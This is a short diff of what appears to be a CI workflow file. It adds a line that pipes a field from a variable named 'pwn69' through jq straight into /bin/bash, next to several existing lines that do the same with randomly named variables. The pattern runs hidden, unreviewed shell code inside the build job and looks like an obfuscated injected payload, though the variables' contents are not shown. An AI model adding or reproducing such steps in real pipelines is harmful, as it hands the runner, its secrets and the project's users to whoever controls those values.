@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$ybvb12" | jq -r .kar165 | /bin/bash
           echo $rwbkg39197 | jq -r .ehjc830 | /bin/bash
           printf '%s' "$eg00034" | jq -r .mq03621 | /bin/bash
+          echo $pwn69 | jq -r .truov0 | /bin/bash
 
       - name: Upload results
         if: always()
